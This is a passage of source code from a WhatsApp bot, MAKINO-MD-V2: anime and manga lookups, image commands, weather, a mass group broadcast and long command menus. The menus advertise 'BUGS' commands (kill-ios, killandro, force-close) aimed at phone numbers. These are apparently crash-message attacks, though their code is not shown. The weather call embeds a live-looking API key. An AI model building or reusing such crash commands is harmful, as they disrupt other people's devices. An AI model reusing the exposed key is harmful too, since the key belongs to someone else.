
        reply(mess.waiting)
        waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)
        let button1Messages = {
          image: { url: waifudd.data.url },
          caption: `Here it is...`,

        }
        await Taira.sendMessage(m.chat, button1Messages, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;


      case 'animewall2': case 'animewallpaper2':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        const { AnimeWallpaper } = require("anime-wallpaper")
        if (!q) return reply('Please enter a seach term!')
        const wall = new AnimeWallpaper();
        const pages = [1, 2, 3, 4];
        const random = pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
          .getAnimeWall4({ title: q, type: "sfw", page: pages })
          .catch(() => null);
        const i = Math.floor(Math.random() * wallpaper.length);
        var walb = [
          { buttonId: `${prefix}animewall2 ${q}`, buttonText: { displayText: `>>` }, type: 1 },
        ]
        let wal = {
          image: { url: wallpaper[i].image },
          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          footer: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          buttons: walb,
          headerType: 4
        }
        await Taira.sendMessage(m.chat, wal, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;



      //
      case 'anime': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "🍁", key: m.key } });
        if (!text) return reply(`Please proide a search term!\n\n*Example:* ${prefix}anime naruto`)

        const malScraper = require('mal-scraper')
        reply(mess.waiting);
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`${p}Could not find your scarch`)
        let animetxt = `
  🎀 *Title: ${anime.title}*
  🎋 *Type: ${anime.type}*
  🎐 *Premiered on: ${anime.premiered}*
  💠 *Total Episodes: ${anime.episodes}*
  📈 *Status: ${anime.status}*
  💮 *Genres: ${anime.genres}
  📍 *Studio: ${anime.studios}*
  🌟 *Score: ${anime.score}*
  💎 *Rating: ${anime.rating}*
  🏅 *Rank: ${anime.ranked}*
  💫 *Popularity: ${anime.popularity}*
  ♦️ *Trailer: ${anime.trailer}*
  🌐 *URL: ${anime.url}*
  ❄ *Description:* ${anime.synopsis}*`
        await Taira.sendMessage(m.chat, { image: { url: anime.picture }, caption: animetxt }, { quoted: m })
      }
        break;


      case 'manga':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "🍁", key: m.key } })

        reply(mess.waiting)
        const { Manga } = require("@shineiichijo/marika")
        const manga = new Manga();
        if (!q) return reply(`Please proide a search term!\n\n_Example:_ ${prefix}manga naruto`)
        let srh = await manga.searchManga(q)
        let mang = `*Title:* ${srh.data[0].title}\n`;
        mang += `*Status:* ${srh.data[0].status}\n`;
        mang += `*Total Volumes:* ${srh.data[0].volumes}\n`;
        mang += `*Total Chapters:* ${srh.data[0].chapters}\n`;
        mang += `*Genres:*\n`;
        for (let i = 0; i < srh.data[0].genres.length; i++) {
          mang += `\t\t\t\t\t\t\t\t${srh.data[0].genres[i].name}\n`;
        }
        mang += `*Published on:* ${srh.data[0].published.from}\n`;
        mang += `*Score:* ${srh.data[0].scored}\n`;
        mang += `*Popularity:* ${srh.data[0].popularity}\n`;
        mang += `*Favorites:* ${srh.data[0].favorites}\n`;
        mang += `*Authors:*\n`;
        for (let i = 0; i < srh.data[0].authors.length; i++) {
          mang += `\t\t\t\t\t\t\t\t\t${srh.data[0].authors[i].name} (${srh.data[0].authors[0].type})\n`;
        }
        mang += `\n*URL:* ${srh.data[0].url}\n\n`;
        if (srh.data[0].background !== null)
          mang += `*Background:* ${srh.data[0].background}`;
        mang += `*Description:* ${srh.data[0].synopsis.replace(
          /\[Written by MAL Rewrite]/g,
          ""
        )}`;
        Taira.sendMessage(m.chat, { image: { url: srh.data[0].images.jpg.large_image_url }, caption: mang }, { quoted: m })
        break;


      case 'waifu':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        waifuddd = await axios.get('https://waifu.pics/api/sfw/waifu')
        let button4Messagess = {
          image: { url: waifuddd.data.url },
          caption: '♱MAKINO-MD-V2♱♡⃤',
        }

        await Taira.sendMessage(m.chat, button4Messagess, { quoted: m }).catch(err => {
          return ('error..')
        })
        break;


      case 'neko':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        waifuddd = await axios.get('https://waifu.pics/api/sfw/neko')
        let buttonMessagessf = {
          image: { url: waifuddd.data.url },
          caption: '♱MAKINO-MD-V2♱♡⃤',
        }

        await Taira.sendMessage(m.chat, buttonMessagessf, { quoted: m }).catch(err => {
          return ('error..')
        })
        break;


      case 'loli':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        waifuddd = await axios.get('https://waifu.pics/api/sfw/shinobu')
        let buttonMessagessfgr = {
          image: { url: waifuddd.data.url },
          caption: '♱MAKINO-MD-V2♱♡⃤',
        }

        await Taira.sendMessage(m.chat, buttonMessagessfgr, { quoted: m }).catch(err => {
          return ('error..')
        })
        break;



      case 'bcgc':
      case 'broadcastgc': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isCreator) return reply(mess.botowner);
        if (!args.join(" ")) return reply(`Please enter some text to broadcast! \n\nExample : ${prefix + command} ${global.OwnerName}`);

        let getGroups = await Taira.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let anu = groups.map(v => v.id)
        reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
        for (let i of anu) {
          await sleep(1500)
          let a = `${pushname}'s Broadcast\n\n` + '' + `Message: ${text}\n\n` + ''
          Taira.sendMessage(i, {
            text: a,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: '♱MAKINO-MD-V2♱♡⃤',
                body: `Sent to ${i.length} Group`,
                thumbnailUrl: 'https://telegra.ph/file/dfad7a7afb54498391945.jpg',
                sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          })
        }
        reply(`Successful in sending Broadcast To ${anu.length} Group`)
      }
        break


      case 'help':
      case 'allmenu':
      case 'menu': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
          await Taira.sendMessage(from, { react: { text: "📄", key: m.key } });
         const helpMenuText = `
╭════════════════ ᐖ
┃ *♱MAKINO-MD-V2♱♡⃤* 
╰════════════════ ᐖ
╭════════════════ ᐖ
┃
┃   *Uꜱᴇʀ :  ${pushname}*
┃   *Time  : ${nowtime}*
┃   *Dᴀᴛᴇ : ${kaidate}*
┃   *Oᴡɴᴇʀ : ${global.OwnerName}*
┃   *Pʟᴜɢɪɴꜱ : ${v2features()}*
┃   *Pʀᴇꜰɪx : ${prefix}*
┃   *Rᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}*
┃   *RAM  : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*
┃   *CPU : ${totalCpuUsage}%*
┃   *Developer : Tᴀɪʀᴀ Mᴀᴋɪɴᴏ*
┃
╰════════════════ ᐖ
 ✧✧✧✧✧✧✧✧✧✧✧✧✧ 
╭════════════════ ⪩
┃〘 *Command list* 〙
╰════════════════ ⪨ ${readmore}
╭═══════════════ ⪩
╰╮╰┈➤ *CORE*
╭═══════════════ ⪩
┃ • ping   
┃ • ʀᴇᴘᴏ 
┃ • ᴀʟɪᴠᴇ
┃ • ꜱᴘᴇᴀᴋ
┃ • ꜱᴜᴘᴘᴏʀᴛ
┃ • ꜱᴘᴇᴇᴅᴄʜᴇᴄᴋ
┃ • ꜱᴛᴀʟᴋ
┃ • ꜱᴇᴛᴘʀᴇꜰɪx
┃ • ᴛʏᴘɪɴɢ  
┃ • ᴀᴜᴛᴏ-ꜱᴛᴀᴛᴜꜱ
┃ • ʀᴇᴄᴏʀᴅɪɴɢ 
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *OWNER*
╭═══════════════ ⪩
┃ • Addowner
┃ • delowner
┃ • clear
┃ • ᴘᴜʙʟɪᴄ
┃ • self
┃ • ʀᴇꜱᴛᴀʀᴛ
┃ • setppbot
┃ • ꜱʟᴇᴇᴘ
┃ • ᴊᴏɪɴ
┃ • ᴘᴏꜱᴛ
┃ • ʟɪꜱᴛɢᴄ
┃ • ʟɪꜱᴛᴘᴄ
┃ • ʟɪꜱᴛᴏɴʟɪɴᴇ 
┃ • ʙʀᴏᴀᴅᴄᴀꜱᴛ
┃ • ʙʏᴇ
┃ • ʙᴀɴɢʀᴏᴜᴘ 
┃ • ʙʟᴏᴄᴋ
┃ • ᴜɴʙʟᴏᴄᴋ
┃ • ʙᴀɴ ᴀᴅᴅ
┃ • ʙᴀɴ ᴅᴇʟ
┃ • GETCASE
┃ • ANTICALL
┃ • STATUSVIEW
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *BUGS*
╭═══════════════ ⪩
┃ •  iloveyou amount pc/gc
┃ •  kissme amount pc/gc
┃ •  force-close number
┃ •  kill-ios number|amount
┃ •  killandro number
┃ •  gc-bug group-link
┃ •  v2bug number|amount
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *GROUP*
╭═══════════════ ⪩
┃ • ᴘʀᴏᴍᴏᴛᴇ  
┃ • ᴅᴇᴍᴏᴛᴇ  
┃ • ɢʀᴏᴜᴘ-ᴇᴠᴇɴᴛ  
┃ • ɢʀᴏᴜᴘꜱᴇᴛᴛɪɴɢ
┃ • ɢʀᴏᴜᴘʟɪɴᴋ
┃ • ɪɴᴠɪᴛᴇ
┃ • ᴀᴅᴅ
┃ • savecontact
┃ • kick
┃ • left
┃ • ꜱᴇᴛɴᴀᴍᴇ
┃ • ꜱᴇᴛɢᴄᴘᴘ
┃ • ꜱᴇᴛᴅᴇꜱᴄ
┃ • ʀᴇᴠᴏᴋᴇ
┃ • ᴛᴀɢᴀᴅᴍɪɴꜱ
┃ • ᴛᴀɢᴀʟʟ
┃ • ʜɪᴅᴇᴛᴀɢ
┃ • ɴꜱꜰᴡ 
┃ • ᴀɴᴛɪʟɪɴᴋɢᴄ 
┃ • ᴀɴᴛɪʟɪɴᴋᴛᴛ
┃ • ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ
┃ • ᴀɴᴛɪʟɪɴᴋꜰʙ
┃ • ᴀɴᴛɪʟɪɴᴋɪɢ
┃ • ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛ
┃ • ᴀɴᴛɪᴡᴀᴍᴇ     
┃ • ᴀɴᴛɪʟɪɴᴋᴀʟʟ
┃ • Kickall
┃ • Mute
┃ • Unmute
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *AI*
╭═══════════════ ⪩
┃ • ɢᴘᴛ 
┃ • ᴅᴀʟʟᴇ 
┃ • ꜱᴀʏ
┃ • ꜰʟɪᴘᴛᴇxᴛ
┃ • ᴛᴏʟᴇᴛᴛᴇʀ
┃ • ᴛʀᴀɴꜱʟᴀᴛᴇ
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *DOWNLOADER*
╭═══════════════ ⪩
┃ •  ᴘʟᴀʏ
┃ •  ᴠɪᴅᴇᴏ
┃ •  YTDL
┃ •  ʏᴛᴍᴘ3
┃ •  ʏᴛᴍᴘ4
┃ •  video
┃ •  ʟʏʀɪᴄꜱ
┃ •  ᴀᴘᴋ
┃ •  ᴍᴏᴠɪᴇ
┃ •  mediafire
┃ •  ɢᴏᴏɢʟᴇ
┃ •  ɢɪᴍᴀɢᴇ
┃ •  ᴘɪɴᴛᴇʀᴇꜱᴛ
┃ •  ᴡᴀʟʟᴘᴀᴘᴇʀ
┃ •  ʀɪɴɢᴛᴏɴᴇ
┃ •  ɪᴍᴀɢᴇ
┃ •  insta
┃ •  ꜱᴇᴀʀᴄʜ
┃ •  ꜱᴇᴀʀᴄʜɢᴄ
┃ •  ᴡɪᴋɪᴍᴇᴅɪᴀ
┃ •  ʏᴛᴠɪᴅᴇᴏ
┃ •  ᴍᴇᴅɪᴀꜰɪʀᴇ
┃ •  ɪɴꜱᴛᴀɢʀᴀᴍ
┃ •  ꜰᴀᴄᴇʙᴏᴏᴋ
┃ •  yts
┃ •  ᴛᴡɪᴛᴛᴇʀ
┃ •  ᴛɪᴋᴛᴏᴋ
┃ •  happymod
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *GAMES*
╭═══════════════ ⪩
┃ • ᴛᴛᴛ 
┃ • delttt
┃ • ᴛɪᴄᴛᴀᴄᴛᴏᴇ   
┃ • ᴛʀᴜᴛʜ
┃ • ᴅᴀʀᴇ
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ REACTIONS
╭═══════════════ ⪩
┃ •  ᴄᴜᴅᴅʟᴇ
┃ •  ʜᴜɢ
┃ •  ᴋɪꜱꜱ
┃ •  ʙᴏɴᴋ
┃ •  ᴄʀʏ
┃ •  ʙᴜʟʟʏ
┃ •  ꜱʟᴀᴘ
┃ •  ᴋɪʟʟ
┃ •  ʜᴀᴘᴘʏ
┃ •  ʟɪᴄᴋ
┃ •  ᴘᴀᴛ
┃ •  ꜱᴍᴜɢ
┃ •  ɴᴏᴍ
┃ •  ɢʟᴏᴍᴘ
┃ •  ʙɪᴛᴇ
┃ •  ʏᴇᴇᴛ
┃ •  ʙʟᴜꜱʜ
┃ •  ꜱᴍɪʟᴇ
┃ •  ᴡᴀᴠᴇ
┃ •  ʜɪɢʜꜰɪᴠᴇ
┃ •  ʜᴀɴᴅʜᴏʟᴅ
┃ •  ᴘᴏᴋᴇ
┃ •  ᴡɪɴᴋ
┃ •  ᴅᴀɴᴄᴇ
┃ •  ᴄʀɪɴɢᴇ 
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *CONVERTERS*
╭═══════════════ ⪩
┃ •  ꜱᴛɪᴄᴋᴇʀ 
┃ •  ᴛᴏɪᴍɢ
┃ •  toimage
┃ •  ᴛᴏɢɪꜰ
┃ •  ᴜʀʟ
┃ •  vv
┃ •  ᴛᴏᴍᴘ3
┃ •  ᴛᴏᴀᴜᴅɪᴏ
┃ •  ᴇᴍᴏᴊɪᴍɪx 
┃ •  ꜱᴛᴇᴀʟ 
┃ •  tovv
┃ •  ʙᴀꜱꜱ  
┃ •  ᴛᴇᴍᴘᴏ
┃ •  ʙʟᴏᴡɴ
┃ •  ʀᴏʙᴏᴛ
┃ •  ⬡ꜱʟᴏᴡ
┃ •  ꜱQᴜɪʀʀᴇʟ 
┃ •  ᴅᴇᴇᴘ
┃ •  ᴇᴀʀʀᴀᴘᴇ
┃ •  ꜰᴀꜱᴛ 
┃ •  ꜰᴀᴛ
┃ •  ɴɪɢʜᴛᴄᴏʀᴇ
┃ •  ʀᴇᴠᴇʀꜱᴇ  
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *FUN*
╭═══════════════ ⪩
┃ •  reaction
┃ •  cutecheck
┃ •  couple
┃ •  soulmate
┃ •  handsomecheck
┃ •  beautifulcheck
┃ •  awesomecheck
┃ •  greatcheck
┃ •  gaycheck
┃ •  uglycheck
┃ •  charactercheck
┃ •  lesbiancheck
┃ •  hornychec
┃ •  prettycheck
┃ •  lovelycheck
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *Anime/Weebs*
╭═══════════════ ⪩
┃ •  ᴀɴɪᴍᴇ
┃ •  ᴀɴɪᴍᴇꜱᴛᴏʀʏ 
┃ •  ᴀᴡᴏᴏ
┃ •  ᴍᴀɴɢᴀ 
┃ •  ᴀɴɪᴍᴇᴡᴀʟʟ
┃ •  ᴀɴɪᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀ2  
┃ •  ᴄᴏꜱᴘʟᴀʏ
┃ •  ᴀɴɪᴍᴇɴᴏᴍ
┃ •  ꜰᴇᴇᴅ
┃ •  ꜰᴏxɢɪʀʟ
┃ •  ᴡᴀɪꜰᴜ
┃ •  ᴡᴀɪꜰᴜ2 
┃ •  ᴡᴀɪꜰᴜ3 
┃ •  ʟᴏʟɪ
┃ •  ᴄᴏꜰꜰᴇᴇ
┃ •  ᴛɪᴄᴋʟᴇ
┃ •  ᴍᴇᴏᴡ
┃ •  ɴᴇᴋᴏ
┃ •  ɴᴇᴋᴏ2 
┃ •  ᴍɪɢᴜᴍɪɴ  
┃ •  ᴡᴀʟʟᴘᴀᴘᴇʀ  
┃ •  ᴀɴɪᴍᴇQᴜᴏᴛᴇ  
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *ADDITIONAL*
╭═══════════════ ⪩
┃ •  Qᴜᴏᴛᴇꜱ 
┃ •  ᴡɪᴋɪ
┃ •  ꜱᴛᴀʟᴋɴᴜᴍʙᴇʀ 
┃ •  ɢʜᴘʀᴏꜰɪʟᴇ
┃ •  ꜱᴛɪᴄᴋᴇʀᴍᴇᴍᴇ
┃ •  ᴀꜰᴋ
┃ •  ᴅᴀʀᴋᴊᴏᴋᴇ
┃ •  report
╰════════════════ ⪨
╭═══════════════ ⪩
╰╮╰┈➤ *MENUS*
╭═══════════════ ⪩
┃ •  ALLMENU
┃ •  COREMENU
┃ •  OWNERMENU
┃ •  GROUPMENU
┃ •  ɢʜᴘʀᴏꜰɪʟᴇ
┃ •  AIMENU
┃ •  DOWNLOADERMENU
┃ •  MENUS
┃ •  GAMEMENU
┃ •  REACTIONMENU
┃ •  CONVERTERMENU
┃ •  FUNMENU
┃ •  ANIMEMENU
┃ •  ADDITIOALMENU
╰════════════════ ⪨`;
if(global.menutype === "v1"){
          let msg = generateWAMessageFromContent(m.key.remoteJid, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: helpMenuText
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "            ♱MAKINO-MD-V2♱♡⃤"
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://graph.org/file/b06744135f2f12ec4b4be.jpg' } }, { upload: Taira.waUploadToServer })),


                    title: "                      Command list",
                    subtitle: "Browse through the available commands",
                    hasMediaAttachment: false
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"OWNER 🫠","id":'${prefix}owner'}`
                      },
	              {
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"SERVER 📶","id":'${prefix}server'}`
                      },
                      {
                        "name": "cta_url",
                        "buttonParamsJson": `{"display_text":"REPO 🔗 ","url":"https://github.com/anonphoenix007/MAKINO-MD-V2","merchant_url":"https://github.com/anonphoenix007/MAKINO-MD-V2"}`

                      },
                      {
                        "name": "cta_url",
                        "buttonParamsJson": `{"display_text":"Channel 📰","url":"https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r","merchant_url":"https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r"}`
                      },
                      {
                        "name": "cta_url",
                        "buttonParamsJson": `{"display_text":"Taira 🫡","url":"https://t.me/Tha_Healer","merchant_url":"https://t.me/Tha_Healer"}`
                      }
                    ]
                  })
                })
              }
            }
          }, {});


          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
            const errorMessage = 'Error: Invalid message key.';
            console.error(errorMessage);
            return reply(errorMessage);
          }

          await Taira.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          });
} else if(global.menutype === "v2"){
  await Taira.sendMessage(m.chat , { text: helpMenuText}, {quoted: statrp })
  } else if (global.menutype === "v3"){
  Taira.sendMessage(m.chat, {
//video : { url: "https://graph.org/file/fad20d219e426d3c65e5f.mp4" }, 
video: { url: "https://widipe.com/file/jpaLRLZBBpPE.mp4" },
caption: helpMenuText,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "Taira Tech",
newsletterJid: "120363320283062687@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: "♱MAKINO-MD-V2♱♡⃤",
body: "Taira Makino",
thumbnailUrl: "https://widipe.com/file/rGQFTKL2GoTF.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
}) 
} else if(global.menutype === "v4") {

  Taira.sendMessage(m.chat, {
      //video : { url: "https://graph.org/file/fad20d219e426d3c65e5f.mp4" },
      video: { url: "https://widipe.com/file/jpaLRLZBBpPE.mp4" },
      gifPlayback: true,
      caption: helpMenuText,
      contextInfo: {
      externalAdReply: {
      title: '♱MAKINO-MD-V2♱♡⃤',
      body: 'Taira Makino',
      thumbnailUrl: "https://widipe.com/file/rGQFTKL2GoTF.jpg",
      sourceUrl: `https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r`,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
} else if(global.menutype === "v5") {
  Taira.sendMessage(m.chat, {
                        image: fs.readFileSync('./Assets/pic7.jpg'),
                        caption: helpMenuText
                    }, {
                        quoted: m
                    })
} else return
}

        break;
    
    case 'menutype': {
      if (isBan) return m.reply(mess.banned)
		  if (isBanChat) return m.reply(mess.bangc);
      if (!isCreator) return m.reply(mess.botowner)
      if(!args[0]) return reply(`Select a menu type\n\nv1 - reply button\nv2 - status reply\nv3 - Looped menu\nv4 - Video Menu\nv5 - image menu`)
      if(args[0].startsWith('v')) {
        global.menutype = args[0]
        reply(`Menu type Successfully changed to ${args[0]}`)
      } else reply(`type ${prefix}menutype to see available menus.`)
    }
break;



      //////search
      case 'weather':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "✨", key: m.key } })
        if (!args[0]) return reply("Enter your location to search weather.")
        myweather = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args.join(" ")}&units=metric&appid=e409825a497a0c894d2dd975542234b0&language=tr`)

        const weathertext = `           🌤 *Weather Report* 🌤  \n\n🔎 *Search Location:* ${myweather.data.name}\n*💮 Country:* ${myweather.data.sys.country}\n🌈 *Weather:* ${myweather.data.weather[0].description}\n🌡️ *Temperature:* ${myweather.data.main.temp}°C\n❄️ *Minimum Temperature:* ${myweather.data.main.temp_min}°C\n📛 *Maximum Temperature:* ${myweather.data.main.temp_max}°C\n💦 *Humidity:* ${myweather.data.main.humidity}%\n🎐 *Wind:* ${myweather.data.wind.speed} km/h\n`
        Taira.sendMessage(from, { video: { url: 'https://media.tenor.com/bC57J4v11UcAAAPo/weather-sunny.mp4' }, gifPlayback: true, caption: weathertext }, { quoted: m })

        break;

      //-----------------------------------------------------------------------------------------------------------------------------------//
      ///funmenu

      case 'stupidcheck': case 'uncleancheck':
      case 'hotcheck': case 'smartcheck':
      case 'greatcheck':
      case 'evilcheck': case 'dogcheck':
      case 'coolcheck':
      case 'waifucheck':
        cantik = body.slice(1)
        const okebnh1 = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
        const Tairakak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
        Taira.sendMessage(m.chat, { text: Tairakak }, { quoted: m })
        break;

        case 'coremenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *CORE*
╭═══════════════ ⪩
┃ • ping
┃ • ʀᴇᴘᴏ
┃ • ᴀʟɪᴠᴇ
┃ • ꜱᴘᴇᴀᴋ
┃ • ꜱᴜᴘᴘᴏʀᴛ
┃ • ꜱᴘᴇᴇᴅᴄʜᴇᴄᴋ
┃ • ꜱᴛᴀʟᴋ
┃ • ꜱᴇᴛᴘʀᴇꜰɪx
┃ • ᴛʏᴘɪɴɢ
┃ • ᴀᴜᴛᴏ-ꜱᴛᴀᴛᴜꜱ
┃ • ʀᴇᴄᴏʀᴅɪɴɢ
┃ • pmblocker
┃ •  uptime
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break


case 'ownermenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *OWNER*
╭═══════════════ ⪩
┃ • Addowner
┃ • Delowner
┃ • clear
┃ • ᴘᴜʙʟɪᴄ
┃ • self
┃ • ʀᴇꜱᴛᴀʀᴛ
┃ • setppbot
┃ • ꜱʟᴇᴇᴘ
┃ • ᴊᴏɪɴ
┃ • ᴘᴏꜱᴛ
┃ • ʟɪꜱᴛɢᴄ
┃ • ʟɪꜱᴛᴘᴄ
┃ • ʟɪꜱᴛᴏɴʟɪɴᴇ
┃ • ʙʀᴏᴀᴅᴄᴀꜱᴛ
┃ • ʙʏᴇ
┃ • ʙᴀɴɢʀᴏᴜᴘ
┃ • ʙʟᴏᴄᴋ
┃ • ᴜɴʙʟᴏᴄᴋ
┃ • ʙᴀɴ ᴀᴅᴅ
┃ • ʙᴀɴ ᴅᴇʟ
┃ • GETCASE
┃ • ANTICALL
┃ • STATUSVIEW 
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break 


case 'groupmenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *GROUP*
╭═══════════════ ⪩
┃ • ᴘʀᴏᴍᴏᴛᴇ
┃ • ᴅᴇᴍᴏᴛᴇ
┃ • ɢʀᴏᴜᴘ-ᴇᴠᴇɴᴛ
┃ • ɢʀᴏᴜᴘꜱᴇᴛᴛɪɴɢ
┃ • ɢʀᴏᴜᴘʟɪɴᴋ
┃ • ɪɴᴠɪᴛᴇ
┃ • ᴀᴅᴅ
┃ • savecontact
┃ • kick
┃ • left
┃ • Antibot
┃ • ꜱᴇᴛɴᴀᴍᴇ
┃ • ꜱᴇᴛɢᴄᴘᴘ
┃ • ꜱᴇᴛᴅᴇꜱᴄ
┃ • ʀᴇᴠᴏᴋᴇ
┃ • ᴛᴀɢᴀᴅᴍɪɴꜱ
┃ • ᴛᴀɢᴀʟʟ
┃ • ʜɪᴅᴇᴛᴀɢ
┃ • ɴꜱꜰᴡ
┃ • ᴀɴᴛɪʟɪɴᴋɢᴄ
┃ • ᴀɴᴛɪʟɪɴᴋᴛᴛ
┃ • ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ
┃ • ᴀɴᴛɪʟɪɴᴋꜰʙ
┃ • ᴀɴᴛɪʟɪɴᴋɪɢ
┃ • ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛ
┃ • ᴀɴᴛɪᴡᴀᴍᴇ
┃ • ᴀɴᴛɪʟɪɴᴋᴀʟʟ
┃ • Kickall
┃ • Mute
┃ • Unmute
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break

case 'aimenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *AI*
╭═══════════════ ⪩
┃ • ᴄʜᴀᴛɢᴘᴛ
┃ • ᴅᴀʟʟᴇ
┃ • ꜱᴀʏ
┃ • ꜰʟɪᴘᴛᴇxᴛ
┃ • ᴛᴏʟᴇᴛᴛᴇʀ
┃ • ᴛʀᴀɴꜱʟᴀᴛᴇ
╰════════════════ ⪨
`
await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
}
break


case 'downloadmenu': {
let messg = `
╭═══════════════ ⪩
╰╮╰┈➤ *DOWNLOADER*
╭═══════════════ ⪩
┃ •  ᴘʟᴀʏ
┃ •  ᴠɪᴅᴇᴏ
┃ •  YTDL
┃ •  ʏᴛᴍᴘ4
┃ •  video
┃ •  ʟʏʀɪᴄꜱ
┃ •  ᴍᴏᴠɪᴇ
┃ •  mediafire
┃ •  ɢᴏᴏɢʟᴇ
┃ •  ɢɪᴍᴀɢᴇ
┃ •  ᴘɪɴᴛᴇʀᴇꜱᴛ
┃ •  ᴡᴀʟʟᴘᴀᴘᴇʀ
┃ •  ʀɪɴɢᴛᴏɴᴇ
┃ •  ɪᴍᴀɢᴇ
┃ •  insta
┃ •  ꜱᴇᴀʀᴄʜ
┃ •  ꜱᴇᴀʀᴄʜɢᴄ
┃ •  ᴡɪᴋɪᴍᴇᴅɪᴀ
┃ •  ʏᴛᴠɪᴅᴇᴏ
┃ •  ᴍᴇᴅɪᴀꜰɪʀᴇ
┃ •  ɪɴꜱᴛᴀɢʀᴀᴍ
┃ •  ꜰᴀᴄᴇʙᴏᴏᴋ
┃ •  yts
┃ •  ᴛᴡɪᴛᴛᴇʀ
